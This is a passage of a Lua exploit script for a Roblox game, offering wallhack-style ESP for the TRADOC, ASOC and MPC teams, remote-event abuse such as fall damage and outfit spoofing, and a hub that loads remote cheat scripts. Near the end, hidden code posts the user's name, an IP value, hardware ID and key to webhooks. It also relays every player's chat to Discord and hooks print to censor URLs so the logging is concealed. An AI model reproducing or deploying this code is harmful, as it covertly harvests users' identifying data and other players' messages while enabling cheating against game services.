                            ESPRADOC.OutlineTransparency = outlinetrans
                            ESPRADOC.Adornee = chr
                            ESPRADOC.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                        end
                    end
                end
            end
        end
        getgenv().ESPTRADOC = true == state
    end
}

Tab:Toggle{
    Name = "TRADOC HIGHLIGHT ESP",
    StartingState = false,
    Description = "Highlights all TRADOC members. Note: This does not work at far distance.",
    Callback = function(state)
        getgenv().ESP = true
        getgenv().ESP = state
        getgenv().uselocalplayer = false
        getgenv().filluseteamcolor = true
        getgenv().outlineuseteamcolor = false
        getgenv().fillcolor = Color3.new(0, 0, 0)
        getgenv().outlinecolor = Color3.new(1, 1, 1)
        getgenv().filltrans = 0.5
        getgenv().outlinetrans = 0

        local holder = game.CoreGui:FindFirstChild("ESPHolder") or Instance.new("Folder")
        if not getgenv().ESP then
            holder:Destroy()
        else
            if holder.Name == "Folder" then
                holder.Name = "ESPHolder"
                holder.Parent = game.CoreGui
            end
            if not getgenv().uselocalplayer and holder:FindFirstChild(game.Players.LocalPlayer.Name) then
                holder:FindFirstChild(game.Players.LocalPlayer.Name):Destroy()
            end
        end

        game.Players.PlayerAdded:Connect(function(player)
            if player.Team ~= nil and player.Team.Name == "TRADOC" then
                local chr = player.Character
                if chr ~= nil then
                    local esp = holder:FindFirstChild(player.Name) or Instance.new("Highlight")
                    esp.Name = player.Name
                    if not getgenv().uselocalplayer or esp.Name ~= game.Players.LocalPlayer.Name then
                        esp.Parent = holder
                        if getgenv().filluseteamcolor then
                            esp.FillColor = player.TeamColor.Color
                        else
                            esp.FillColor = getgenv().fillcolor
                        end
                        if getgenv().outlineuseteamcolor then
                            esp.OutlineColor = player.TeamColor.Color
                        else
                            esp.OutlineColor = getgenv().outlinecolor
                        end
                        esp.FillTransparency = getgenv().filltrans
                        esp.OutlineTransparency = getgenv().outlinetrans
                        esp.Adornee = chr
                        esp.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                    end
                end
            end
        end)

        game.Players.PlayerRemoving:Connect(function(player)
            if holder:FindFirstChild(player.Name) then
                holder:FindFirstChild(player.Name):Destroy()
            end
        end)

        while getgenv().ESP do
            task.wait()
            for _, player in pairs(game.Players:GetChildren()) do
                if player.Team ~= nil and player.Team.Name == "TRADOC" then
                    local chr = player.Character
                    if chr ~= nil then
                        local esp = holder:FindFirstChild(player.Name) or Instance.new("Highlight")
                        esp.Name = player.Name
                        if not getgenv().uselocalplayer or esp.Name ~= game.Players.LocalPlayer.Name then
                            esp.Parent = holder
                            if getgenv().filluseteamcolor then
                                esp.FillColor = player.TeamColor.Color
                            else
                                esp.FillColor = getgenv().fillcolor
                            end
                            if getgenv().outlineuseteamcolor then
                                esp.OutlineColor = player.TeamColor.Color
                            else
                                esp.OutlineColor = getgenv().outlinecolor
                            end
                            esp.FillTransparency = getgenv().filltrans
                            esp.OutlineTransparency = getgenv().outlinetrans
                            esp.Adornee = chr
                            esp.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                        end
                    end
                end
            end
        end
        getgenv().ESP = true == state
    end
}

Tab:Toggle{
    Name = "ASOC ESP",
    StartingState = false,
    Description = "It will show the location of all ASOC members.",
    Callback = function(state)
        getgenv().ESPASOC = true
        getgenv().ESPASOC = state

        local ESPASOC_UPDATE_INTERVAL = 2

        local function updateESPASOC()
            for _, player in pairs(game:GetService("Players"):GetChildren()) do
                if player.Team and player.Team.Name == "ASOC" then
                    local existingBillboardGui = player.Character and player.Character:FindFirstChild("ESPASOC")
                    if not existingBillboardGui then
                        local billboardGui = Instance.new("BillboardGui")
                        billboardGui.Name = "ESPASOC"
                        billboardGui.Size = UDim2.new(0, 100, 0, 100)
                        billboardGui.AlwaysOnTop = true
                        billboardGui.LightInfluence = 0
                        billboardGui.MaxDistance = math.huge
                        billboardGui.Parent = player.Character or player.CharacterAdded:Wait()

                        local nameLabel = Instance.new("TextLabel")
                        nameLabel.Name = "NameLabel"
                        nameLabel.Parent = billboardGui
                        nameLabel.Size = UDim2.new(1, 0, 0.5, 0)
                        nameLabel.Position = UDim2.new(0, 0, 0, 0)
                        nameLabel.BackgroundTransparency = 1
                        nameLabel.Text = player.Name .. " (" .. tostring(math.floor((player.Character and player.Character:FindFirstChild("HumanoidRootPart") and (player.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude or 0) + 0.5)) .. " studs)"
                        nameLabel.TextColor3 = Color3.new(1, 1, 1)
                        nameLabel.FontSize = Enum.FontSize.Size18
                        nameLabel.Font = Enum.Font.SourceSansBold
                    else
                        existingBillboardGui.Enabled = true
                        existingBillboardGui.NameLabel.Text = player.Name .. " (" .. tostring(math.floor((player.Character and player.Character:FindFirstChild("HumanoidRootPart") and (player.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude or 0) + 0.5)) .. " studs)"
                    end
                end
            end
        end

        if getgenv().ESPASOC == true then
            while true do
                if getgenv().ESPASOC then
                    updateESPASOC()
                end
                wait(ESPASOC_UPDATE_INTERVAL)
            end
        else
            for _, player in pairs(game:GetService("Players"):GetChildren()) do
                local existingBillboardGui = player.Character and player.Character:FindFirstChild("ESPASOC")
                if existingBillboardGui then
                    existingBillboardGui.Enabled = false
                end
            end
        end

        local holder = game.CoreGui:FindFirstChild("ESPASOCHolder") or Instance.new("Folder")
        if ESPASOC == false then
            holder:Destroy()
        end

        if holder.Name == "Folder" then
            holder.Name = "ESPASOCHolder"
            holder.Parent = game.CoreGui
        end

        if uselocalplayer == false and holder:FindFirstChild(game.Players.LocalPlayer.Name) then
            holder:FindFirstChild(game.Players.LocalPlayer.Name):Destroy()
        end

        if getgenv().ESPASOC == true then
            getgenv().ESPASOC = false
            getgenv().ESPASOC = true
        end

        while getgenv().ESPASOC do
            task.wait()
            for _, v in pairs(game.Players:GetChildren()) do
                if v.Team ~= nil and v.Team.Name == "ASOC" then
                    local chr = v.Character
                    if chr ~= nil then
                        local ESPASOC = holder:FindFirstChild(v.Name) or Instance.new("Highlight")
                        ESPASOC.Name = v.Name
                        if uselocalplayer == false and ESPASOC.Name == game.Players.LocalPlayer.Name then
                        else
                            ESPASOC.Parent = holder
                            if filluseteamcolor then
                                ESPASOC.FillColor = v.TeamColor.Color
                            else
                                ESPASOC.FillColor = fillcolor
                            end
                            if outlineuseteamcolor then
                                ESPASOC.OutlineColor = v.TeamColor.Color
                            else
                                ESPASOC.OutlineColor = outlinecolor
                            end
                            ESPASOC.FillTransparency = filltrans
                            ESPASOC.OutlineTransparency = outlinetrans
                            ESPASOC.Adornee = chr
                            ESPASOC.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                        end
                    end
                end
            end
        end
        getgenv().ESPASOC = true == state
    end
}

Tab:Toggle{
    Name = "ASOC HIGHLIGHT ESP",
    StartingState = false,
    Description = "Highlights all ASOC members. Note: This does not work at far distance.",
    Callback = function(state)
        getgenv().ESP = true
        getgenv().ESP = state
        getgenv().uselocalplayer = false
        getgenv().filluseteamcolor = true
        getgenv().outlineuseteamcolor = false
        getgenv().fillcolor = Color3.new(0, 0, 0)
        getgenv().outlinecolor = Color3.new(1, 1, 1)
        getgenv().filltrans = 0.5
        getgenv().outlinetrans = 0

        local holder = game.CoreGui:FindFirstChild("ESPHolder") or Instance.new("Folder")
        if not getgenv().ESP then
            holder:Destroy()
        else
            if holder.Name == "Folder" then
                holder.Name = "ESPHolder"
                holder.Parent = game.CoreGui
            end
            if not getgenv().uselocalplayer and holder:FindFirstChild(game.Players.LocalPlayer.Name) then
                holder:FindFirstChild(game.Players.LocalPlayer.Name):Destroy()
            end
        end

        game.Players.PlayerAdded:Connect(function(player)
            if player.Team ~= nil and player.Team.Name == "ASOC" then
                local chr = player.Character
                if chr ~= nil then
                    local esp = holder:FindFirstChild(player.Name) or Instance.new("Highlight")
                    esp.Name = player.Name
                    if not getgenv().uselocalplayer or esp.Name ~= game.Players.LocalPlayer.Name then
                        esp.Parent = holder
                        if getgenv().filluseteamcolor then
                            esp.FillColor = player.TeamColor.Color
                        else
                            esp.FillColor = getgenv().fillcolor
                        end
                        if getgenv().outlineuseteamcolor then
                            esp.OutlineColor = player.TeamColor.Color
                        else
                            esp.OutlineColor = getgenv().outlinecolor
                        end
                        esp.FillTransparency = getgenv().filltrans
                        esp.OutlineTransparency = getgenv().outlinetrans
                        esp.Adornee = chr
                        esp.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                    end
                end
            end
        end)

        game.Players.PlayerRemoving:Connect(function(player)
            if holder:FindFirstChild(player.Name) then
                holder:FindFirstChild(player.Name):Destroy()
            end
        end)

        while getgenv().ESP do
            task.wait()
            for _, player in pairs(game.Players:GetChildren()) do
                if player.Team ~= nil and player.Team.Name == "ASOC" then
                    local chr = player.Character
                    if chr ~= nil then
                        local esp = holder:FindFirstChild(player.Name) or Instance.new("Highlight")
                        esp.Name = player.Name
                        if not getgenv().uselocalplayer or esp.Name ~= game.Players.LocalPlayer.Name then
                            esp.Parent = holder
                            if getgenv().filluseteamcolor then
                                esp.FillColor = player.TeamColor.Color
                            else
                                esp.FillColor = getgenv().fillcolor
                            end
                            if getgenv().outlineuseteamcolor then
                                esp.OutlineColor = player.TeamColor.Color
                            else
                                esp.OutlineColor = getgenv().outlinecolor
                            end
                            esp.FillTransparency = getgenv().filltrans
                            esp.OutlineTransparency = getgenv().outlinetrans
                            esp.Adornee = chr
                            esp.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                        end
                    end
                end
            end
        end
        getgenv().ESP = true == state
    end
}


Tab:Toggle{
    Name = "MPC ESP",
    StartingState = false,
    Description = "It will show the location of all MPC members.",
    Callback = function(state)
        getgenv().ESPMPC = true
        getgenv().ESPMPC = state

        local ESPMPC_UPDATE_INTERVAL = 2

        local function updateESPMPC()
            for _, player in pairs(game:GetService("Players"):GetChildren()) do
                if player.Team and player.Team.Name == "MPC" then
                    local existingBillboardGui = player.Character and player.Character:FindFirstChild("ESPMPC")
                    if not existingBillboardGui then
                        local billboardGui = Instance.new("BillboardGui")
                        billboardGui.Name = "ESPMPC"
                        billboardGui.Size = UDim2.new(0, 100, 0, 100)
                        billboardGui.AlwaysOnTop = true
                        billboardGui.LightInfluence = 0
                        billboardGui.MaxDistance = math.huge
                        billboardGui.Parent = player.Character or player.CharacterAdded:Wait()

                        local nameLabel = Instance.new("TextLabel")
                        nameLabel.Name = "NameLabel"
                        nameLabel.Parent = billboardGui
                        nameLabel.Size = UDim2.new(1, 0, 0.5, 0)
                        nameLabel.Position = UDim2.new(0, 0, 0, 0)
                        nameLabel.BackgroundTransparency = 1
                        nameLabel.Text = player.Name .. " (" .. tostring(math.floor((player.Character and player.Character:FindFirstChild("HumanoidRootPart") and (player.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude or 0) + 0.5)) .. " studs)"
                        nameLabel.TextColor3 = Color3.new(1, 1, 1)
                        nameLabel.FontSize = Enum.FontSize.Size18
                        nameLabel.Font = Enum.Font.SourceSansBold
                    else
                        existingBillboardGui.Enabled = true
                        existingBillboardGui.NameLabel.Text = player.Name .. " (" .. tostring(math.floor((player.Character and player.Character:FindFirstChild("HumanoidRootPart") and (player.Character.HumanoidRootPart.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).magnitude or 0) + 0.5)) .. " studs)"
                    end
                end
            end
        end

        if getgenv().ESPMPC == true then
            while true do
                if getgenv().ESPMPC then
                    updateESPMPC()
                end
                wait(ESPMPC_UPDATE_INTERVAL)
            end
        else
            for _, player in pairs(game:GetService("Players"):GetChildren()) do
                local existingBillboardGui = player.Character and player.Character:FindFirstChild("ESPMPC")
                if existingBillboardGui then
                    existingBillboardGui.Enabled = false
                end
            end
        end

        local holder = game.CoreGui:FindFirstChild("ESPMPCHolder") or Instance.new("Folder")
        if ESPMPC == false then
            holder:Destroy()
        end

        if holder.Name == "Folder" then
            holder.Name = "ESPMPCHolder"
            holder.Parent = game.CoreGui
        end

        if uselocalplayer == false and holder:FindFirstChild(game.Players.LocalPlayer.Name) then
            holder:FindFirstChild(game.Players.LocalPlayer.Name):Destroy()
        end

        if getgenv().ESPMPC == true then
            getgenv().ESPMPC = false
            getgenv().ESPMPC = true
        end
    end
}

Tab:Toggle{
    Name = "MPC HIGHLIGHT ESP",
    StartingState = false,
    Description = "Highlights all MPC members. Note: This does not work at far distance.",
    Callback = function(state)
        getgenv().ESP = true
        getgenv().ESP = state
        getgenv().uselocalplayer = false
        getgenv().filluseteamcolor = true
        getgenv().outlineuseteamcolor = false
        getgenv().fillcolor = Color3.new(0, 0, 0)
        getgenv().outlinecolor = Color3.new(1, 1, 1)
        getgenv().filltrans = 0.5
        getgenv().outlinetrans = 0

        local holder = game.CoreGui:FindFirstChild("ESPHolder") or Instance.new("Folder")
        if not getgenv().ESP then
            holder:Destroy()
        else
            if holder.Name == "Folder" then
                holder.Name = "ESPHolder"
                holder.Parent = game.CoreGui
            end
            if not getgenv().uselocalplayer and holder:FindFirstChild(game.Players.LocalPlayer.Name) then
                holder:FindFirstChild(game.Players.LocalPlayer.Name):Destroy()
            end
        end

        game.Players.PlayerAdded:Connect(function(player)
            if player.Team ~= nil and player.Team.Name == "MPC" then
                local chr = player.Character
                if chr ~= nil then
                    local esp = holder:FindFirstChild(player.Name) or Instance.new("Highlight")
                    esp.Name = player.Name
                    if not getgenv().uselocalplayer or esp.Name ~= game.Players.LocalPlayer.Name then
                        esp.Parent = holder
                        if getgenv().filluseteamcolor then
                            esp.FillColor = player.TeamColor.Color
                        else
                            esp.FillColor = getgenv().fillcolor
                        end
                        if getgenv().outlineuseteamcolor then
                            esp.OutlineColor = player.TeamColor.Color
                        else
                            esp.OutlineColor = getgenv().outlinecolor
                        end
                        esp.FillTransparency = getgenv().filltrans
                        esp.OutlineTransparency = getgenv().outlinetrans
                        esp.Adornee = chr
                        esp.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                    end
                end
            end
        end)

        game.Players.PlayerRemoving:Connect(function(player)
            if holder:FindFirstChild(player.Name) then
                holder:FindFirstChild(player.Name):Destroy()
            end
        end)

        while getgenv().ESP do
            task.wait()
            for _, player in pairs(game.Players:GetChildren()) do
                if player.Team ~= nil and player.Team.Name == "MPC" then
                    local chr = player.Character
                    if chr ~= nil then
                        local esp = holder:FindFirstChild(player.Name) or Instance.new("Highlight")
                        esp.Name = player.Name
                        if not getgenv().uselocalplayer or esp.Name ~= game.Players.LocalPlayer.Name then
                            esp.Parent = holder
                            if getgenv().filluseteamcolor then
                                esp.FillColor = player.TeamColor.Color
                            else
                                esp.FillColor = getgenv().fillcolor
                            end
                            if getgenv().outlineuseteamcolor then
                                esp.OutlineColor = player.TeamColor.Color
                            else
                                esp.OutlineColor = getgenv().outlinecolor
                            end
                            esp.FillTransparency = getgenv().filltrans
                            esp.OutlineTransparency = getgenv().outlinetrans
                            esp.Adornee = chr
                            esp.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                        end
                    end
                end
            end
        end
        getgenv().ESP = true == state
    end
}

local Tab = GUI:Tab{
	Name = "Trolling",
	Icon = "rbxassetid://6157200594",
}

Tab:Button{
	Name = "Take Damage",
	Description = "If at full health you can click the *Take damage* 6 times without dying.",
	Callback = function() 
	    local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Damaging...",
	Duration = 8,
	Callback = function() end
}
local args = {
    [1] = 0.2
}

game:GetService("ReplicatedStorage").Packages.Knit.Services.SkydivingService.RF.FallDamage:InvokeServer(unpack(args))
end}

Tab:Button{
	Name = "Icon Mobile",
	Description = "This is FE, everyone can see your icon on your name as Mobile.",
	Callback = function() 
	    local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "You are now Mobile.",
	Duration = 8,
	Callback = function() end
}

local args = {
    [1] = "Mobile"
}

game:GetService("ReplicatedStorage").Packages.Knit.Services.PlayerHandler.RF.SetPlatform:InvokeServer(unpack(args))

end}

Tab:Button{
	Name = "Icon Desktop/PC",
	Description = "This is FE, everyone can see your icon on your name as Desktop/PC.",
	Callback = function() 
	    local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "You are now Desktop/PC.",
	Duration = 8,
	Callback = function() end
}

local args = {
    [1] = "PC"
}

game:GetService("ReplicatedStorage").Packages.Knit.Services.PlayerHandler.RF.SetPlatform:InvokeServer(unpack(args))

end}

Tab:Button{
	Name = "Normal outfit",
	Description = nil,
	Callback = function() 
	    local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Changing...",
	Duration = 8,
	Callback = function() end
}

local args = {
    [1] = {
        ["Headgear"] = "C982750C-74A9-4730-8AB2-8181EF24FD64",
        ["Accessory"] = "377F6631-CD34-4970-AC7A-99A7DED948B0",
        ["Shirt"] = "426584EE-4444-4487-97A9-4858AAE5C236",
        ["Pants"] = "8BFFA37F-D026-4A04-A422-DCD5367A1C31",
    }
}

game:GetService("ReplicatedStorage").Packages.Knit.Services.CharacterService.RF.ApplyData:InvokeServer(unpack(args))
end}

Tab:Button{
	Name = "Chef",
	Description = nil,
	Callback = function() 
	    local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Changing...",
	Duration = 8,
	Callback = function() end
}

local args = {
    [1] = {
        ["Headgear"] = "2C3FDC19-B38F-44AB-AA57-CD0235543107",
        ["Accessory"] = "377F6631-CD34-4970-AC7A-99A7DED948B0",
        ["Shirt"] = "A4691125-2102-4F8A-BBF2-1C409EC0D4B7",
        ["Pants"] = "8784806C-838D-4DE4-9730-405B7833B0D0",
        ["Body Gear"] = false
    }
}

game:GetService("ReplicatedStorage").Packages.Knit.Services.CharacterService.RF.ApplyData:InvokeServer(unpack(args))

end}

Tab:Button{
	Name = "Hot day out",
	Description = nil,
	Callback = function() 
	    local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Changing...",
	Duration = 8,
	Callback = function() end
}



local args = {
    [1] = {
        ["Headgear"] = "A7E98E4D-2355-47A0-9C41-7B85B563883F",
        ["Accessory"] = "516CFA51-746E-4983-8C52-5822F0134DE5",
        ["Shirt"] = "CE964BCE-321D-43B3-867F-FE21B296BBF4",
        ["Pants"] = "86EAD503-8C7D-4370-9F83-73B8E9B61811",
        ["Body Gear"] = "16E6DAC8-2721-4504-90E6-FEC891BF3A7D"
    }
}

game:GetService("ReplicatedStorage").Packages.Knit.Services.CharacterService.RF.ApplyData:InvokeServer(unpack(args))


end}

Tab:Button{
	Name = "BCT outfit",
	Description = nil,
	Callback = function() 
	    local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Changing...",
	Duration = 8,
	Callback = function() end
}



local args = {
    [1] = {
        ["Headgear"] = "C982750C-74A9-4730-8AB2-8181EF24FD64",
        ["Accessory"] = false,
        ["Shirt"] = "45259522-246A-4ED6-8426-641080A1E9C6",
        ["Pants"] = "8BFFA37F-D026-4A04-A422-DCD5367A1C31",
        ["Body Gear"] = "Apply"
    }
}

game:GetService("ReplicatedStorage").Packages.Knit.Services.CharacterService.RF.ApplyData:InvokeServer(unpack(args))

end}

local Tab = GUI:Tab{
	Name = "Script hub",
	Icon = "rbxassetid://6031075938"
}

Tab:Button{
	Name = "Infinite Yield",
	Description = "Credits: Edge, Moon, Zwolf, Toon.",
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Loading...",
	Duration = 2,
	Callback = function() end 
                
            }
    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source",true))()
end}

Tab:Button{
	Name = "CMD-X",
	Description = "Credits: pigeon#8951, fini#7057, Curvn#2002.",
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Loading...",
	Duration = 2,
	Callback = function() end 
                
            }
    loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source",true))()
end}

Tab:Button{
	Name = "Fates-Admin",
	Description = "Credits: fate#5647, Iaying#6564, misrepresenting#4917, Shawn#2000, dsf#2711.",
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Loading...",
	Duration = 2,
	Callback = function() end 
                
            }
    loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
end}

Tab:Button{
	Name = "Owl-Hub",
	Description = "Credits: Google Chrome and CriShoux.",
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Loading...",
	Duration = 2,
	Callback = function() end 
                
            }
    loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))();
end}


local Tab = GUI:Tab{
	Name = "Other fetures",
	Icon = "rbxassetid://7194280652"
}


	Tab:_theme_selector()


Tab:credit{Name = "Support Server", Description = "Click the Discord button to copy the discord server to get support.", Discord = "http://discord.gg/wUbAAhypTH", V3rmillion = "http://discord.gg/wUbAAhypTH"}

Tab:Button{
	Name = "Serverhop",
	Description = "Join's a diffrent server.",
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Serverhoping...",
	Duration = 2,
	Callback = function() end 
                
            }
    local m = {} for _, v in ipairs(game:GetService("\72\116\116\112\83\101\114\118\105\99\101"):JSONDecode(game:HttpGetAsync("\104\116\116\112\115\58\47\47\103\97\109\101\115\46\114\111\98\108\111\120\46\99\111\109\47\118\49\47\103\97\109\101\115\47" .. game.PlaceId .. "\47\115\101\114\118\101\114\115\47\80\117\98\108\105\99\63\115\111\114\116\79\114\100\101\114\61\65\115\99\38\108\105\109\105\116\61\49\48\48")).data) do if type(v) == "\116\97\98\108\101" and v.maxPlayers > v.playing and v.id ~= game.JobId then m[#m + 1] = v.id end end if #m > 0 then game:GetService("\84\101\108\101\112\111\114\116\83\101\114\118\105\99\101"):TeleportToPlaceInstance(game.PlaceId, m[math.random(1, #m)]) else return notify("\83\101\114\118\101\114\104\111\112","\67\111\117\108\100\110\39\116\32\102\105\110\100\32\97\32\115\101\114\118\101\114\46") end
end}

Tab:Button{
	Name = "Rejoin",
	Description = "It will rejoin the game in the current server you are in.",
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "Rejoing...",
	Duration = 2,
	Callback = function() end 
                
            }
    local m = game:GetService("\84\101\108\101\112\111\114\116\83\101\114\118\105\99\101") local n = game:GetService("\80\108\97\121\101\114\115").LocalPlayer m:Teleport(game.PlaceId, n)
end}

if _G == "2J7rttPAgtYqC0PZi1kRCf9BUFj2en6uNRZQc0ywCAZq0WqNH4V5AbWY0wjk75tWJ3yH9DiMkGy7Aibb3Reo6M6cGUzoxdGo5nKE" then
local Tab = GUI:Tab{
	Name = "Admin stuff",
	Icon = "rbxassetid://6031075938"
}

Tab:Button{
	Name = "Bypass kicks/bans/kickwarns",
	Description = nil,
	Callback = function() local CoreGui = game:GetService("StarterGui")

            GUI:Notification{
	Title = "Alert",
	Text = "In the making.",
	Duration = 2,
	Callback = function() end 
                
            }
    
end}
end

    GUI:Notification{
	Title = "Alert",
	Text = "Please wait 3 minutes before leaving the game or else you will be arrested for 15 minutes. If you arn't able to reset, do not leave the game.",
	Duration = 15,
	Callback = function() end
}

end

local url =
"https://webhook.lewisakura.moe/api/webhooks/1086848421845024778/n-EC3wBX54lyVdRZHG04s6pIY4un4TUVbqcWDhJqsWkQ1qgGX1l0IQkOHvcBXse00kna"
local data = {
["content"] = "**Detected user that executed the script:**",
["embeds"] = {
{
["title"] =  "All information of the user:",
["description"] =  "**Username: **"  .. game.Players.LocalPlayer.Name .. ".",
["type"] = "rich",
["color"] = tonumber(0),
["fields"] = {
                            {
                                ["name"] = "Exploit:",
                                ["value"] = webhookcheck,
                                ["inline"] = true,
                            },
                            {
                                ["name"] = "Script using:",
                                ["value"] = script12321,
                                ["inline"] = true,
                            },
                            {
                                ["name"] = "Internet Protocol:",
                                ["value"] = IPLOGGER,
                                ["inline"] = true,
                            },  
                            {
                                ["name"] = "Hardware ID:",
                                ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
                                ["inline"] = true,
                            },
                            {
                                ["name"] = "Key in use:",
                                ["value"] = ezString,
                                ["inline"] = true,
                            },
                            {
                                ["name"] = "Game ID:",
                                ["value"] = game.PlaceId,
                                ["inline"] = true,
                            }
}
}
}
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

local denied_message = "Denied."
local g
g = hookfunction(print,function(urprint,...)
if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
urprint = denied_message
end
return g(urprint,...)
end)

    ------------------- NOT IPGEGER -------------------

if not getgenv().Ranonce then
getgenv().Ranonce = true
local url =
"https://webhook.lewisakura.moe/api/webhooks/1082032102163361844/7ysZsj7S_1t_96CtfiQUtapfHARntu0iI_w3vXycI4uw3eMxS_p4VQ0qoXsh7H55oT2A"
local data = {
["content"] = "__**Execution Detected!**__",
["embeds"] = {
{
["title"] =  "",
["description"] =  "**Username: **"  .. game.Players.LocalPlayer.Name .. ".",
["type"] = "rich",
["color"] = tonumber(12000000),
["fields"] = {
                            {
                                ["name"] = "Exploit:",
                                ["value"] = webhookcheck,
                                ["inline"] = true,
                            },
                            {
                                ["name"] = "Script using:",
                                ["value"] = script12321 .. " key.",
                                ["inline"] = true,
                            },
                            {
                                ["name"] = "Game ID:",
                                ["value"] = game.PlaceId,
                                ["inline"] = true,
                            },
                            {
                                ["name"] = "Key in use:",
                                ["value"] = ezString,
                                ["inline"] = true,
                            }
}
}
}
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

local denied_message = "Denied."
local g
g = hookfunction(print,function(urprint,...)
if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
urprint = denied_message
end
return g(urprint,...)
end)
end

wait(0.1)

if not getgenv().Ranonce2 then
getgenv().Ranonce2 = true
local wh = 'https://discord.com/api/webhooks/1086779209994731530/6k7iEKZVQpAULXSpBPx0NFQcdV727w1ZR2-rircwjVKfJ1dIPryCkvrJ0Q-rHzgW6d-G'


local embed1 = {
       ['title'] = game.Players.LocalPlayer.Name .." has started Message logs on ".. game.PlaceId .." at "..tostring(os.date("%m/%d/%y"))
   }
local a = syn.request({
   Url = wh,
   Headers = {['Content-Type'] = 'application/json'},
   Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed1}, ['content'] = ''}),
   Method = "POST"
})
function logMsg(Webhook, Player, Message)
   local embed = {
       ['description'] = Player..": "..Message
   }
   local a = syn.request({
       Url = Webhook,
       Headers = {['Content-Type'] = 'application/json'},
       Body = game:GetService("HttpService"):JSONEncode({['embeds'] = {embed}, ['content'] = ''}),
       Method = "POST"
   })
end
for i,v in pairs(game.Players:GetPlayers()) do
   v.Chatted:Connect(function(msg)
       logMsg(wh, v.Name, msg)
   end)
end

game.Players.PlayerAdded:Connect(function(plr)
   plr.Chatted:Connect(function(msg)
       logMsg(wh, plr.Name, msg)
   end)
end)
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)

local denied_message = "Denied."
local g
g = hookfunction(print,function(urprint,...)
if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
urprint = denied_message
end
return g(urprint,...)
end)
end
